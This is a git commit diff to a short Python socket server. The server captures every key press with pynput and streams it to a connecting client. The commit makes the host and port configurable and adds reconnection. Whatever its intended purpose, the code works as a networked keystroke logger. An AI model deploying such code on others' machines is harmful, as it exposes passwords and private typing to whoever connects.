585040acf67770c8848aa50463ce6101291bf2e8
ultility <56175528+ultility@users.noreply.github.com>
2021-11-26 19:04:50 +0200

    Update server.py

--- python/1/server.py
+++ python/1/server.py
@@ -1,28 +1,34 @@
 import socket
-import threading
 
 from pynput.keyboard import Key, Listener
+import sys
 
-HOST = '127.0.0.1'
-PORT = 12045
+HOST = sys.argv[1]
+PORT = int(sys.argv[2])
 global conn
 
 def key_press(key):
 	k = str(key)
 	k = k.replace("'", "")
-	conn.sendall(bytes(k, "ascii"))
+	try:
+		conn.sendall(bytes(k, "ascii"))
+	except:
+		print("connection closed")
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-	s.bind((HOST,PORT))
-	s.listen()
+while True:
+	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+		s.bind((HOST,PORT))
+		s.listen()
 
-	conn, addr = s.accept()
-	listener = Listener(on_press=key_press)
-	listener.start()
-	with conn:
-		print('Connected by, ', addr)
-		while True:
-			data = conn.recv(1024)
-			if not data:
-				break
+		conn, addr = s.accept()
+		listener = Listener(on_press=key_press)
+		listener.start()
+		with conn:
+			print('Connected by, ', addr)
+			while True:
+				data = conn.recv(1024)
+				if not data:
+					break
+				print(data.decode("ASCII"))
+
 
